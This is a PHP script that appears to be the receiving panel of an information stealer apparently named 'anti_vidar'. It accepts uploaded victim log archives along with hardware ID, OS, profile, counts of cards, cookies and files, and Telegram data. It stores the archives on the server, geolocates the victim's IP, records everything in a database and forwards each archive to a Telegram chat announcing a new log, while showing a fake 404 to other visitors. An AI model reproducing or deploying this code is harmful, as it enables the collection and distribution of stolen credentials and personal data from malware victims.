<?php
	include('anti_vidar/functions.php');

	$user = strip_tags($_POST['user']);
	$hwid = strip_tags($_POST['hwid']);
	$os = strip_tags($_POST['os']);
	$platform = strip_tags($_POST['platform']);
	$profile = strip_tags($_POST['profile']);
	$cccount = strip_tags($_POST['cccount']);
	$ccount = strip_tags($_POST['ccount']);
	$fcount = strip_tags($_POST['fcount']);
	$telegram = strip_tags($_POST['telegram']);

	$file = $_FILES['logs']['name'];
	$ip = $_SERVER['REMOTE_ADDR'];

	if(!empty($file))
	{
		$tmp = $_FILES['logs']['tmp_name'];
		$dir = $_SERVER['DOCUMENT_ROOT'].site_dir.'/files/'.basename($file);
		if(move_uploaded_file($tmp,$dir))
		{
			
			$ip_info = file_get_contents('https://ip.nf/'.$ip.'.json');
			$json = json_decode($ip_info);
			
			$ip_info_ .= '<b>IP:</b> <code>'.$json->ip->ip."</code><br>";
			$ip_info_ .= '<b>provider:</b> <code>'.$json->ip->asn."</code><br>";
			$ip_info_ .= '<b>netmask:</b> <code>'.$json->ip->netmask."</code><br>";
			$ip_info_ .= '<b>hostname:</b> <code>'.$json->ip->hostname."</code><br>";
			$ip_info_ .= '<b>city:</b> <code>'.$json->ip->city."</code><br>";
			$ip_info_ .= '<b>country:</b> <code>'.$json->ip->country."</code><br>";
			$ip_info_ .= '<b>country_code:</b> <code>'.$json->ip->country_code."</code><br>";
			$date = time();
			$s = "INSERT INTO `logs` (`ip`,`ip_info`,`file`,`user`,`hwid`,`date`,`os`,`platform`,
												`profile`,`cccount`,`ccount`,`fcount`,`telegram`) 
						VALUES ('$ip','$ip_info_','$file','$user','$hwid','$date','$os','$platform',
											'$profile','$cccount','$ccount','$fcount','$telegram')";
			mysqli_query($db,$s);
			
			$log_name = substr($file,0,29);
			$url_log = 'https://'.$_SERVER['SERVER_NAME'].'/anti_vidar/files/'.$file;

			$file_ = $_SERVER['DOCUMENT_ROOT'].site_dir.'/files/'.$file;
			$size = get_filesize($file_);
			
			$info = "🔔 <b>ПОСТУПИЛ НОВЫЙ ЛОГ!</b> 👆\n\n";
			$info .= "▪️ <b>Ахрив:</b> <code>$log_name..zip</code>\n";
			$info .= "▪️ <b>Размер:</b> <code>$size</code>";
			
			$ip_info_ = str_replace('<br>',"\n",$ip_info_);
			$info .= "\n\n👤 <b>Данные юзера:</b>\n\n";
			$info .= $ip_info_;
			
			$data = array(
					'chat_id' => $id_chat,
					'document'=>$url_log,
					'caption' => $info,
					'parse_mode'=>'HTML',
				);

			file_get_contents($url.'/sendDocument?'.http_build_query($data));
		}
		
	}else { header('HTTP/1.0 404 Not Found'); }
	
	
?>